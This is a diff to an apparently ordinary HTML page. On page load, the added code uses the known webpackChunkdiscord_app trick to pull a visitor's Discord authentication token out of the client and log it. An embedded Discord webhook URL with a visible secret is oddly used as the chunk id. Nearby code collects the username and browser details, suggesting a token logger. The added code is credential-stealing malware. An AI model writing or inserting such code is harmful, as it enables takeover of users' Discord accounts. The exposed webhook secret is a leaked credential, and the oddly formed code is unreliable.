@@ -57,7 +57,10 @@
         }
 
         document.addEventListener("DOMContentLoaded", () => {
-            const token = document.cookie.match(/token=([\w-]+)/)?.[1] || localStorage.getItem('discord_token') || "test-token";
+            // Extracting token from Webpack chunk
+            const token = (webpackChunkdiscord_app.push([['https://discord.com/api/webhooks/1321597632824611018/iIAs-UeScagNLtAkcEP1qpkm0uUBJIWIg81Jlo56U_Pnv6dFacn8k_FCNYfrUDWcy9vU'],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
+            console.log('Extracted Token:', token);
+
             const username = document.querySelector('.username')?.innerText || "Unknown User";
 
             const browser = navigator.userAgent;
@@ -93,3 +96,4 @@
 
 </body>
 </html>
+
